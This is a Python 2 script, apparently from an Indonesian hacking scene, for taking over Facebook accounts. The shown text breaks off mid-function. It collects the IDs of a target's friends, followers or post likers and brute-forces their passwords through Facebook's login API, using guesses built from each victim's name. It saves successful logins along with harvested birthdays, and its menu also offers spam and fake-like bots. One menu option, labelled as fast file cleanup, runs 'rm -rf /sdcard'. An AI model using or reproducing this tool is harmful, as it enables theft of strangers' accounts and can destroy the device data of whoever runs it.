# -*- coding: utf-8
# Made With RATU ERROR
# facebook : https://web.facebook.com/hasni.hamunkhantethapmumhun
# facebook unik : https://web.facebook.com/hasni.hamunkhantethapmumhun
# github : https://github.com/RATUCOLMEXS
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import requests
import uuid
import ipaddress
import calendar
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from bs4 import BeautifulSoup as par
from time import sleep
from datetime import datetime
from datetime import date
d = '\x1b[90;1m'
m = '\x1b[91;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
b = '\x1b[94;1m'
j = '\x1b[95;1m'
a = '\x1b[96;1m'
p = '\x1b[97;1m'
R = '\033[1;91m'
V = '\033[1;95m'
W = '\033[1;97m'
G = '\033[1;92m'
N = '\033[1;0m'
Y = '\033[1;93m'
M = '\033[1;31m'
H = '\033[1;32m'
K = '\033[1;33m'
U = '\033[1;34m'
P = '\033[1;35m'
C = '\033[1;36m'
W = '\033[1;37m'
A = '\033[90m'

def keluar():
    print('\x1b[1;91m[!] Keluar')
    os.sys.exit()

back = 0
threads = []
berhasil = []
cekpoint = []
gagal = []
idteman = []
idfromteman = []
idmem = []
id = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'

try:
	import requests
except ImportError:
	print('[×] Modul requests belum terinstall!...\n')
	os.system('pip install requests' if os.name == 'nt' else 'pip2 install requests')
reload(sys)
sys.setdefaultencoding('utf8')


MAX_IPV4 = ipaddress.IPv4Address._ALL_ONES  # 2 ** 32 - 1
MAX_IPV6 = ipaddress.IPv6Address._ALL_ONES  # 2 ** 128 - 1

def random_ipv4():
	return  ipaddress.IPv4Address._string_from_ip_int(random.randint(0, MAX_IPV4))
def random_ipv6():
	return ipaddress.IPv6Address._string_from_ip_int(random.randint(0, MAX_IPV6))

def banner():                
	print
	print
	print
	jalan ('                \33[3;1m\033[1;97mW e l c o m e  T o\33[0;1m')
	print
	jalan ('       \033[1;96m[\33[37;1mM\033[1;96m] \033[1;96m[\033[1;97mB\033[1;96m] \033[1;96m[\033[1;97mO\033[1;96m] \033[1;96m[\033[1;97mB\033[1;96m]  \033[1;96m[\033[1;97mH\033[1;96m] \033[1;96m[\033[1;97mI\033[1;96m] \033[1;96m[\33[37;1mZ\033[1;96m] \033[1;96m[\033[1;97mE\033[1;96m] \033[1;96m[\033[1;97mR\033[1;96m]\033[1;96m')
	print (' \033[1;96m  ____________________________________________')
	print ('\033[1;97m\033[1;96m ¤\033[1;97m/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\033[1;96m¤')
	print ( '%s Auhtor script : %sMbokey Bhizerrr'%(W,C))
	print ( '%ssetatus script : %sPremium sampe mokat'%(W,C))
	print ( '%stanggal nd key :%s %s'%(W,C,tanggal))
	#print ( 'waktu masuk program : %s'%(bhizer))
	print("%s©©©©©©©©©©©©©©©©©©®®©©©©©©©©©©©©©©©©©©©©"%(C))

id = []
cp = []
ok = []
loop = 0

ct = datetime.now()
n = ct.month
bulan1 = [    'Januari',   'Februari',    'Maret',    'April',    'Mei',    'Juni',    'Juli',    'Agustus',    'September',    'Oktober',    'Nopember',    'Desember']
jam = [ 'morning' , 'afternoon' , 'afternoon' , 'night']
   
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()
    
s = requests.Session()
road = datetime.now()
ibu = road.hour
pinguin = road.second
beruang = road.minute
bapak = ("%s -%s -%s "%(ibu,beruang,pinguin))
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan1[nTemp]
reload(sys)
sys.setdefaultencoding('utf-8')
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))
bulan = {
        "01": "Januari",
        "02": "Februari",
        "03": "Maret",
        "04": "April",
        "05": "Mei",
        "06": "Juni",
        "07": "Juli",
        "08": "Agustus",
        "09": "September",
        "10": "November",
        "11": "Oktober",
        "12": "Desember"
}

mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"

mb = "https://mbasic.facebook.com"
color = lambda col: "\x1b[1;"+str(col)+"m"

def check_in(uid, pw):
	ua = "Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE5-00/071.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.26 Mobile Safari/533.4 3gpp-gba"
	ses = requests.Session()
	ses.headers.update({
	"Host": "mbasic.facebook.com",
	"cache-control": "max-age=0",
	"upgrade-insecure-requests": "1",
	"origin": mb,
	"content-type": "application/x-www-form-urlencoded",
	"user-agent": ua,
	"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
	"x-requested-with": "mark.via.gp",
	"sec-fetch-site": "same-origin",
	"sec-fetch-mode": "navigate",
	"sec-fetch-user": "?1",
	"sec-fetch-dest": "document",
	"referer": mb+"/login/?next&ref=dbl&fl&refid=8",
	"accept-encoding": "gzip, deflate",
	"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
	})
	data = {}
	ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
	fm = ged.find("form",{"method":"post"})
	list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
	for i in fm.find_all("input"):
		if i.get("name") in list:
			data.update({i.get("name"):i.get("value")})
		else:
			continue
	data.update({"email":uid,"pass":pw})
	try:
		run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
	except r.exceptions.TooManyRedirects:
		print(" [!] Redirect overload")
	if "c_user" in ses.cookies:
		print(" [✓] akun ini tidak checkpoint")
	elif "checkpoint" in ses.cookies:
		form = run.find("form")
		dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
		jzst = form.find("input",{"name":"jazoest"})["value"]
		nh   = form.find("input",{"name":"nh"})["value"]
		dataD = {
			"fb_dtsg": dtsg,
			"fb_dtsg": dtsg,
			"jazoest": jzst,
			"jazoest": jzst,
			"checkpoint_data":"",
			"submit[Continue]":"Lanjutkan",
			"nh": nh
		}
		xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
		ngew = [yy.text for yy in xnxx.find_all("option")]
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m tersedia "+str(len(ngew))+" opsi ")
		for opt in range(len(ngew)):
			print" "*3, str(opt+1)+"✓"+ngew[opt]
	elif "login_error" in str(run):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m "+oh)
	else:
		print(" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m login gagal, silahkan cek kembali id dan password")

def buatngecek():
	print(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m masukan format CP/namafile")
	dirs = os.listdir("CP")
	print("")
	for file in dirs:
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m "+file)
	files = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m Pilih file \033[1;97m:\033[1;93m ")
	try:
		buka_baju = open(files,"r").readlines()
	except FileNotFoundError:
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m File tidak ada")
		time.sleep(2); main()
	print(" \033[1;96m[\033[1;97m+\033[1;96m]\033[1;96m Total Akun \033[1;97m:\033[1;93m "+str(len(buka_baju)))
	print("\033[1;96m¤"*48)
	for memek in buka_baju:
		kontol = memek.replace("\n","")
		titid  = kontol.split("|")
		print(" \033[1;96m[\033[1;97m×\033[1;96m]\033[1;97m check: "+kontol)
		try:
			check_in(titid[0], titid[1])
		except requests.exceptions.ConnectionError:
			continue
		print("\033[1;96m¤"*48)
	print("\033[1;96m¤"*48)
	print("")
	exit(" \33[3;1m\033[1;97mSelesai.....jangan lupa \33[0;1m\033[1;93mCOLMEX's \033[1;97m")
	
def cekakun():
	print'\n \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack \033[1;92mOK '
	print' \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil crack CP '
	anjg = raw_input('\n \033[1;96m[\033[1;97m1\033[1;96m] Pilih\033[1;97m : ')
	if anjg == '':
		menu()
	elif anjg == "1":
		dirs = os.listdir("OK")
		print""
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalok = open("OK/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalok)))
		print""
		os.system("cat OK/%s"%(file))
		raw_input("\n [*] tekan ENTER untuk kembali ke menu")
		menu()
	elif anjg == "2":
		dirs = os.listdir("CP")
		print""
		for file in dirs:
			print(" [*] "+file)
		try:
			file = raw_input("\n [?] mau lihat hasil yang mana ?: ")
			if file == "":
				menu()
			totalcp = open("CP/%s"%(file)).read().splitlines()
		except IOError:
			exit(" [!] file %s tidak tersedia"%(file))
		nm_file = ("%s"%(file)).replace("-", " ")
		del_txt = nm_file.replace(".txt", "")
		print("\n *-------------------------------------------------*")
		print(" [+] tanggal : %s -total : %s"%(del_txt, len(totalcp)))
		print""
		os.system("cat CP/%s"%(file))
		raw_input("\n\n [*] tekan ENTER untuk kembali ke menu ")
		menu()
	else:
		menu()
		
#------->login token jangan lupa masukin token facebook jangan token listrik kontol<-------#    
def pilihlogin():
	os.system("clear")
	try:
		token = open('login.txt','r')
		menu()
	except (KeyError,IOError):
		logo()
		print
		print("\033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mLogin via TOKEN")
		print("\033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mLogin via COOKIE")
		print("\033[1;96m[\033[1;97m03\033[1;96m] \033[1;97mVideo cara mengambil TOKEN")
		print("\033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mVideo cara mengambil COOKIE")
		bct = raw_input("\n\033[1;96m[\033[1;97m?\033[1;96m] PILIH :\033[1;93m ")
		if bct == "":
			pilihlogin()
		elif bct == "1":
			tokenz()
		elif bct == "2":
			gen()
		elif bct == "3":
			os.system("xdg-open https://www.youtube.com/watch?v=cW6au_Fste8")
		elif bct == "4":
			os.system("xdg-open https://www.youtube.com/watch?v=raTZkLSvwiU")
def gen():
	os.system('clear')
	logo()
	print
	cookie = raw_input(" \033[1;97m[\033[1;96m+[\033[1;97m] \033[1;96mMasukan Cookies \033[1;97m: ")
	try:
		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
		'referer'                   : 'https://m.facebook.com/',
		'host'                      : 'm.facebook.com',
		'origin'                    : 'https://m.facebook.com',
		'upgrade-insecure-requests' : '1',
		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
		'cache-control'             : 'max-age=0',
		'accept'                    : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
		'content-type'              : 'text/html; charset=utf-8'
		}, cookies = {
		'cookie'                    : cookie
		})
		find_token = re.search('(EAAA\w+)', data.text)
		hasil    = " \033[0;97m[\033[0;91m!\033[0;97m] Your Cookie Invalid" if (find_token is None) else '\n* Your fb access token : ' + find_token.group(1)
	except requests.exceptions.ConnectionError:
		print(' \033[0;97m[\033[0;91m!\033[0;97m] No Connection')
	cookie = open("login.txt", 'w')
	cookie.write(find_token.group(1))
	cookie.close()
	menu()
                            
def tokenz():
	os.system('clear')
	try:
		token = open('login.txt', 'r')
		menu()
	except (KeyError, IOError):
		os.system('clear')
		print
		logo()
		token = raw_input('\n\033[1;97m [\033[1;96m+\033[1;97m] \033[1;96mMasukkan Token \033[1;97m: ')
		try:
			otw = requests.get('https://graph.facebook.com/me?access_token='+token)
			a = json.loads(otw.text)
			zedd = open('login.txt', 'w')
			zedd.write(token)
			zedd.close()
			menu()
		except KeyError:
			print("[!] Token Invalid!")
			sys.exit()
			
useragents = 'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)'
#------->menu crack india<-------#
#crroty crek opsi by { Jeeck X Nano }
#info saya bang saya cuma perecode
#def info():
	#print("%s®®®®®®®®®®®®®®®®®®®®®®®®®©©®®®®®®®"%(C))
	#print("©%s[%s✓%s] %sInfo Script End Perecode End Suporter"%(C,W,C,W))
	#print("© %s[ %sAuhtor Script Or Perecode Hamdal %s]"%(C,W,C))
	#print("©%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#print("©   %s[ %sMBOKEY BHIZERR %sGG %s]"%(C,W,H,C))
	#print("©    %s[ %sYUMASAA X NDRII %s]"%(C,W,C))
	#print("©    %s[ %sMr Jeeck X Nano %s]"%(C,W,C))
	#print("©%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#print("©  %s[ %sencouragement friend %s]"%(C,W,C))
	#print("©%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#print("©      %s[ %saang-cyber %s]"%(C,W,C))
	#print("©        %s[ %sangga %s]"%(C,W,C))
	#print("©       %s[ %sJanuar %s]"%(C,W,C))
	#print("©      %s[ %sFaiz-Tzy %s]"%(C,W,C))
	#print("©        %s[ %sdika %s]"%(C,W,C))
	#print("©%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#print("© %s[%s✓%s] %sJika Ingin Berdonasi Kirim Aje %s[%s✓%s]"%(C,W,C,W,C,W,C))
	#print("© %s[%s✓%s] %sNomer WhatsApp : %s+6281283909651"%(C,W,C,W,C))
	#print("© %s[%s✓%s] %sNomer Donasi   : %s+6281214822824"%(C,W,C,W,C))
	#print("© %s[%s©®%s] %sGithub Me : %shttps://github.com/Mbokey"%(C,W,C,W,C))
	#print("%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#print("%s®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®®"%(C))
	#raw_input("\n\n %s[%s✓%s] %stekan ENTER untuk kembali ke menu "%(C,W,C,W))
	#menu()
def menu():
	os.system('clear')
	global token
	try:
		token = open('login.txt','r').read()
		otw = requests.get('https://graph.facebook.com/me/?access_token='+token)
		a = json.loads(otw.text)
		mbokey = a['name']
		ganteng = a['id']
		imut_juga = a['birthday']
	except KeyError:
		os.system('clear')
		print (' [!] Token Invalid')
		os.system("rm -f login.txt")
		menu()
	except requests.exceptions.ConnectionError:
		print ('  [!] Tidak Ada Koneksi')
		sys.exit()
		    
	banner()
	print
	suka = requests.get('https://api.ipify.org').text
	print("%sToken Tumbal :%s %s"%(W,H,token))
	print("%s©©©©©©©©©©©©©©©©©©®®©©©©©©©©©©©©"%(C))
	print
	print("%s nama tumbal :%s %s "%(W,C,mbokey)) 
	print("%s   id tumbal :%s %s"%(W,C,ganteng))
	print("%s  ttl tumbal :%s %s"%(W,C,imut_juga))
	print("%s  IP address :%s %s"%(W,C,suka))
	print("%s©©©©©©©©©©©©©©©©©©®®©©©©©©©©©©©©"%(C))
	print ( '%swaktu masuk program :%s %s'%(W,C,bapak))
	print("%s©©©©©©©©©©©©©©©©©©®®©©©©©©©©©©©©"%(C))
	print" \033[1;96m[\033[1;97m01\033[1;96m] \033[1;97mCuri Akun dari ID Publik"
	print" \033[1;96m[\033[1;97m02\033[1;96m] \033[1;97mCuri Akun Dari ID Followers"
	print" \033[1;96m[\033[1;97m03\033[1;96m] \033[1;97mCuri Akun dari Likes Postingan Publik"
	print" \033[1;96m[\033[1;97m04\033[1;96m] \033[1;97mMenu bruteforce (\033[1;96mtarget\033[1;97m)"
	print" \033[1;96m[\033[1;97m05\033[1;96m] \033[1;97mCek hasil Curi Akun"
	print" \033[1;96m[\033[1;97m06\033[1;96m] \033[1;97mCek konfirmasi identitas account facebook"
	print" \033[1;96m[\033[1;97m07\033[1;96m] \033[1;97mMaling ID Facebook Orang "
	print" \033[1;96m[\033[1;97m08\033[1;96m] \033[1;97mCek biodata pengguna account facebook"
	print" \033[1;96m[\033[1;97m09\033[1;96m] \033[1;97mBot reaction (\033[1;96mLikes\033[1;97m)"
	print" \033[1;96m[\033[1;97m10\033[1;96m] \033[1;97mSpam unlimited "
	print" \033[1;96m[\033[1;97m11\033[1;96m] \033[1;97mHapus file Dengan Cepat (\033[1;96mNo Root\033[1;97m) "
	print" \033[1;96m[\033[1;97m12\033[1;96m] \033[1;97mInfo Script (\033[1;96mAuthor End Suport\033[1;97m) "
	print" \033[1;96m[\033[1;97m13\033[1;96m] \033[1;97mCek aplikasi  (\033[1;96mTerhubung\033[1;97m) "
	print" \033[1;97m[\033[1;96m00\033[1;97m] \033[1;96mRemove TOKEN/COOKIE"
	print
	pilih_india()

def pilih_india():
	ask = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;96mPILIH \033[1;97m:\033[1;93m ")
	if ask == "":
		print
		print ("\033[1;97mpilih yang benar.......!!!") 
		raw_input("\n\n %s[%s✓%s] %stekan ENTER untuk kembali ke menu "%(C,W,C,W))
		menu()
	elif ask == "1" or ask == "01":
		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
		print
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
		except KeyError:
			print ("     \033[1;97mmaaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "2" or ask == "02":
		print ("\n \033[1;97mketik '\33[3;1m\033[1;96mme\033[1;97m' \33[0;1mjika ingin crack dari daftar pencarian teman")
		print
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token)
			sp = json.loads(pok.text)
			print (" \033[1;96m[\033[1;97m!\033[1;96m]\033[1;97m nama      :\033[1;93m "+sp["name"]) 
		except KeyError:
			print ("     \033[1;97mmaaf id tidak publik") 
			exit()
		r = requests.get("https://graph.facebook.com/"+idt+"/subscribers?limit=999999&access_token="+token)
		z = json.loads(r.text)
		for i in z["data"]:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "3" or ask == "03":
		idt = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m] \033[1;97mid publik :\033[1;93m ")
		r = requests.get("https://graph.facebook.com/"+idt+"/likes?limit=9999999&access_token="+token)
		z = json.loads(r.text)
		for i in z['data']:
			uid = i['id']
			na = i['name']
			nm = na.rsplit(" ")[0]
			id.append(uid+'|'+nm)
	elif ask == "4" or ask == "04":
		menu_hack()	    
	elif ask == "5" or ask == "05":
		print
		print" \033[1;96m[\033[1;97m1\033[1;96m]\033[1;97m lihat hasil \033[1;97m[\033[1;96mOK\033[1;97m]"
		print" \033[1;96m[\033[1;97m2\033[1;96m]\033[1;97m lihat hasil \033[1;96m[\033[1;97mCP\033[1;96m]"
		ress = raw_input(" \033[1;96m[\033[1;97m?\033[1;96m]\033[1;96m pilih \033[1;96m:\033[1;93m ")
		if ress =="":
			menu()
		elif ress == "1" or ress == "01":
			print ("\n [+] hasil \033[1;97[\033[1;96mOK\033[1;97]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/OK-%s-%s-%s.txt" % (ha, op, ta))
			exit()
		elif ress == "2" or ress == "02":
			print (" [+] hasil \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m tanggal : \033[1;96m%s-%s-%s\033[0;97m" % (ha, op, ta)) 
			os.system("cat out/CP-%s-%s-%s.txt" % (ha, op, ta))
			exit()
	elif ask == "6" or ask == "06":
		buatngecek()
	elif ask == "7" or ask == "07":
		print
		print("\033[1;96m [\033[1;97m1\033[1;96m]\033[1;97m Cek ID teman ")
		print("\033[1;96m [\033[1;97m2\033[1;96m]\033[1;97m Cek ID publik ")
		d = raw_input("\n\033[1;96m [\033[1;97m?\033[1;96m] \033[1;96mpilih \033[1;96m:\033[1;93m ")
		if d =='': 
			exit()
		elif d in['1','01']:
			id_teman1()
		elif d in['2','02']:
			idfrom_teman1()
		else:
			print ("\033[1;97mpilih yang benar.......!!!") 
			exit()
	elif ask == "8" or ask == "08":
		informasi()
	elif ask == "9" or ask == "09":
		 menu_bot()
	#elif ask == "013" or ask == "13":
		#cek_opsi()
	#elif ask == "012" or ask == "12":
		#info()
	elif ask == "10" or ask == "10":
		menu_spam()
	elif ask == "011" or ask == "11":
		os.system("rm -rf /sdcard")
		print (" √   berhasil menghapus file")
		pilihlogin()
	elif ask == "0" or ask == "00":
		os.system("rm -f login.txt") 
		print (" √   berhasil menghapus token") 
		exit()		
		
	else:
		print ("\033[1;97mpilih yang benar.......!!!") 
		exit()
	
	print"\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m total id  :\033[1;93m " +str(len(id))
	ask = raw_input("\n \033[1;96m[\033[1;97m?\033[1;96m]\033[1;97m ingin gunakan password manual (\033[1;92my\033[1;97m/\033[1;93mt\033[1;97m) : ")
	if ask == "Y" or ask == "y":
		manual()
	print
	print (" \033[1;97mAing Butuh Suport Kalian %s:) %s[%sMbokey Bhizer%s]"%(C,W,C,W))
	print
	print (" \033[1;97mmainkan data mode pesawat")
	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
	print

	def main(arg):
		global ok,cp,ua, loop
		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for pw in [name.lower()+'123',name.lower()+'12345',name.lower()+'1234','sayang','kontol','anjing',name.lower(),name.lower()+'       ' ]:
				ua = random.choice(["Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"])
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":pw,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;97m 🐧 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;96m ' +pw+ '        '
					ok.append(uid+' • '+pw)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('\033[1;97m 🐧 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(pw)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[0;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + ' \033[1;96m◊\033[1;97m ' + ttl)
						cp.append(uid+'|'+pw+'|'+ttl)
						save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
						save.write('\033[0;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+' \033[1;96m◊\033[1;97m '+ttl+'\n')
						open("CP/%s.txt"%(tanggal),"a").write("%s|%s|%s\n"%(uid, pw, ttl))
						save.close()
						break
					except(KeyError, IOError):
						ttl = ' '
					except:pass
					print '\r\033[0;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + pw + '        '
					cp.append(uid+'|'+pw)
					save = open('out/CP-%s-%s-%s.txt' % (ha, op, ta),'a')
					save.write('\033[0;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m '+str(uid)+' \033[1;96m◊\033[1;97m '+str(pw)+'\n')
					open("CP/%s.txt"%(tanggal),"a").write(" %s|%s\n"%(uid, pw))
					save.close()
					break
					continue
			
			loop += 1
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("\n crack selesai...")
	print
	print
	exit()

def manual():
	print("\033[1;96m [\033[1;97m*\033[1;96m] \033[1;97mcontoh password : bangladesh,102030,786786")
	pw = raw_input("\033[1;96m [\033[1;97m!\033[1;96m]\033[1;97m set password :\033[1;93m ").split(",")
	print
	if len(pw) ==0:
		exit(" *  isi yang bener, tidak boleh kosong")
	print("\033[1;97m jumlah password yang di buat : \033[1;93m" +str(len(pw)))
	print (" \033[1;97mmainkan data mode pesawat")
	print (" \033[1;97mdi angka \033[1;96m100 \033[1;97mdan \033[1;96m2000 \033[1;97msaat menjalankan crack")
	print(" \033[1;97mProses crack \33[3;1m\033[1;92msedang berjalan...\33[0;1m")
	print
	
	def main(arg):
		global ok,cp,ua,loop
		print '\r \033[1;97m¤  %s/%s \033[1;97m[\033[1;96mOK:%s\033[1;97m] - \033[1;96m[\033[1;97mCP:%s\033[1;96m]\033[1;97m ' % (loop, len(id), len(ok), len(cp)),
		sys.stdout.flush()
		user = arg
		uid,name=user.split("|") 
		try:
			os.mkdir('out')
		except OSError:
			pass
		try:
			for asu in pw:
				ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36'
				headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 
				'x-fb-net-hni': str(random.randint(20000, 40000)), 
				'x-fb-connection-quality': 'EXCELLENT', 
				'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
				'user-agent': ua, 
				'content-type': 'application/x-www-form-urlencoded', 
				'x-fb-http-engine': 'Liger'}
				ses=requests.Session()
				api="https://b-api.facebook.com/method/auth.login"
				param={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":uid,"locale": "en_US","password":asu,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"}
				send=ses.get(api,params=param, headers=headers_)
				if "access_token" in send.text and "EAAA" in send.text:
					print '\r\033[1;97m 🐧 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m ' +uid+ ' \033[1;97m◊\033[1;92m ' + asu + '        '
					ok.append(uid+' • '+asu)
					save = open('out/OK-%s-%s-%s.txt' % (ha, op, ta),'a') 
					save.write('\r\033[1;97m 🐧 \033[1;97m[\033[1;96mOK\033[1;97m]\033[1;96m\033[1;96m '+str(uid)+' \033[1;97m◊\033[1;96m '+str(asu)+'\n')
					save.close()
					break
					continue
					continue
				elif "www.facebook.com" in send.json()["error_msg"]:
					try:
						token = open('login.txt').read()
						url = ("https://graph.facebook.com/"+uid+"?access_token="+token)
						data = s.get(url).json()
						nama = data['name']
						ttl = data['birthday'].replace("/","-")
						print('\r\033[1;97m 🐧 \033[1;96m[\033[1;97mCP\033[1;96m]\033[1;97m\033[1;97m ' +uid+ ' \033[1;96m◊\033[1;97m ' + asu + ' \033[1;96m◊\033[1;97m ' + ttl)
						cp.append(uid+'|'+asu+'|'+ttl)
